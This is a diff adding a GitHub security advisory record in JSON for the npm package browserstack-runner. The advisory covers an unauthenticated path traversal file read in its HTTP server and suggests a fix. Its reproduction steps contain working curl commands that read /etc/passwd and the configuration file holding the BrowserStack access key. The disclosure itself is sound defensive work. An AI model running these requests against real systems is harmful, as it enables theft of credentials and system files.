@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-06-03T21:38:43Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "browserstack-runner"
+  },
+  "Advisory": {
+    "DatabaseId": 360532,
+    "Id": "GSA_kwCzR0hTQS04cnB3LTZjcWgtMnY5aM4ABYBU",
+    "GhsaId": "GHSA-8rpw-6cqh-2v9h",
+    "References": [
+      {
+        "Url": "https://github.com/browserstack/browserstack-runner/security/advisories/GHSA-8rpw-6cqh-2v9h"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49144"
+      },
+      {
+        "Url": "https://www.vulncheck.com/advisories/browserstack-runner-path-traversal-via-default-http-handler"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-8rpw-6cqh-2v9h"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-8rpw-6cqh-2v9h"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-49144"
+      }
+    ],
+    "Description": "## Summary\n\nThe HTTP server in browserstack-runner serves files from the project directory via the `_default` handler. This handler uses `path.join(process.cwd(), uri)` to resolve file paths but does not validate that the resulting path stays within the project root. Combined with the server binding on `0.0.0.0` (all interfaces) and the absence of any authentication, this allows an unauthenticated network-adjacent attacker to read arbitrary files from the host filesystem.\n\n## Root Cause\n\n**lib/server.js, lines 530–534 : `_default` handler:**\n\n```javascript\n'_default': function defaultHandler(uri, body, request, response) {\n    var filePath = path.join(process.cwd(), uri);\n    handleFile(filePath, request, response);\n}\n```\n\n`uri` comes from `url.parse(request.url).pathname` (line 540), which preserves `../` sequences. `path.join` resolves them, producing absolute paths outside the project directory. No boundary check is performed before serving the file.\n\n**bin/cli.js, line 131 : server binding:**\n\n```javascript\nserver.listen(parseInt(config.test_server_port, 10));\n```\n\nNo hostname is specified, so Node.js binds on `0.0.0.0` (all interfaces).\n\n**No authentication:** The `_default` handler does not call `getWorkerUuid()` or perform any authentication check.\n\n## Steps to Reproduce\n\n### Step 1 : Start the server (Terminal 1)\n\n```bash\ncd browserstack-runner\necho '\u003chtml\u003e\u003cbody\u003etest\u003c/body\u003e\u003c/html\u003e' \u003e _poc_test.html\necho '{\"username\":\"X\",\"key\":\"X\",\"test_path\":\"_poc_test.html\",\"test_framework\":\"qunit\",\"browsers\":[]}' \u003e browserstack.json\nnode bin/runner.js\n```\n\n### Step 2 : Read arbitrary files (Terminal 2)\n\n**Read /etc/hostname:**\n```bash\ncurl -s --path-as-is \"http://127.0.0.1:8888/../../../etc/hostname\"\n```\n\n**Read /etc/passwd:**\n```bash\ncurl -s --path-as-is \"http://127.0.0.1:8888/../../../etc/passwd\"\n```\n\n**Read the BrowserStack access key from config:**\n```bash\ncurl -s \"http://127.0.0.1:8888/browserstack.json\"\n```\n\n\u003e **Note:** `--path-as-is` is required because curl normalizes `../` sequences\n\u003e by default. Browsers and HTTP libraries that do not normalize URL paths\n\u003e (or that allow raw path construction) can exploit this without special flags.\n\n### Expected Result\n\n- `/etc/hostname` → server returns the machine hostname\n- `/etc/passwd` → server returns the full passwd file\n- `browserstack.json` → server returns the config including the BrowserStack access key\n\n## Impact\n\n- **BrowserStack access key theft** : `browserstack.json` is always in the project root (same directory the server serves from), and contains `username` and `key` in cleartext\n- **Source code theft** : all project files are readable\n- **System file disclosure** : `/etc/passwd`, `/etc/shadow` (if readable), SSH keys, `.env` files, `.npmrc` (npm tokens), etc.\n- **Chainable with Finding #1** : same server, same exposure window, same network-adjacent attacker\n\n## Suggested Fix\n\n1. Validate the resolved path stays within the project root:\n```javascript\nvar filePath = path.resolve(process.cwd(), '.' + uri);\nif (!filePath.startsWith(process.cwd() + path.sep)) {\n    sendError(response, 'Forbidden', 403);\n    return;\n}\n```\n2. Bind on `127.0.0.1`\n3. Add authentication to the `_default` handler",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-03T21:38:40Z",
+    "Severity": "HIGH",
+    "Summary": "browserstack-runner has an unauthenticated arbitrary file read via path traversal in HTTP server",
+    "UpdatedAt": "2026-06-03T21:38:43Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.5,
+      "VectorString": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": ""
+      },
+      "VulnerableVersionRange": "\u003c= 0.9.5"
+    }
+  ]
+}
